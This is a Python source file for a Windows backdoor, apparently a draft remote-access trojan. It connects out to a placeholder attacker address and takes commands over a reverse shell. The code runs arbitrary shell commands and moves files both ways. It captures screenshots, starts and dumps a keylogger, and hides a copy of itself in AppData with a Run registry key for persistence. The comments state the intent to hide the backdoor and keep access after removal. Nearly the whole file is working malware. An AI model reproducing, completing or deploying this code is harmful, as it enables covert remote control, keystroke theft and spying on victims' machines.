################################################################################################################
# Author: astralm0nke on Github (2024)                                                                         #
#----------------------------------------------------- DRAFT --------------------------------------------------#
################################################################################################################
import shutil, sys, os, time, json, socket, subprocess, pyautogui, threading
from termcolor import colored
from Key_Logger import *

##---------------- DRAFT ----------------##
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connection():
    while True:
        time.sleep(45)
        try:
            s.connect(('target_ip', 5555))
            rev_shell()
            s.close()
            break
        except:
            connection() # Repeats until we run server, then it will successfully connect
connection()

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip() # recieve 1024 bytes
            return json.loads(data)
        except ValueError:
            continue

def upload(file):
    f = open(file, 'rb')
    s.send(f.read()) # don't need to encode because reading bytes

def download_file(file):
    f = open(file, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def screenshot():
    my_screenshot = pyautogui.screenshot()
    my_screenshot.save('screen.png')

# Hide backdoor and add to registry; registry keys allow Windows machines to process data
def persist(reg_name, copy_name):
    file_loc = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_loc):
           shutil.copyfile(sys.executable, file_loc)
           subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v' + reg_name + ' /t REG_SZ /d "' + file_loc + '"', shell=True)
           colored(reliable_send(f'[+] Created persistence with Reg Key: {reg_name}'), 'green')
        else:
            colored(reliable_send('[!] Persistence already exists.'), 'yellow')
    except:
        colored(reliable_send('[!-] Error persisting on target machine.'), 'red')
        
def rev_shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[6:])
        elif command[:8] == 'download':
            upload(command[9:])
        elif command[:10] == 'screenshot':
            upload('screen.png')
            os.remove('screen.png')
        elif command[:12] == 'keylog_start':
            colored(reliable_send('[-_] Initializing Keylogger...'), 'yellow')
            keylogger = KeyLogger() # Note: need backdoor.py and Key_Logger.py on target machine
            t = threading.Thread(target=keylogger.start())
            t.start()
            colored(reliable_send('[+] Keylogger Started'), 'green')
        elif command[:11] == 'keylog_dump':
            logs = keylogger.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            keylogger.self_destruct()
            t.join()
            reliable_send('[-] Keylogger Stopped')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ') # This ensures even if backdoor is deleted, we can still connect.
            persist(reg_name, copy_name)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)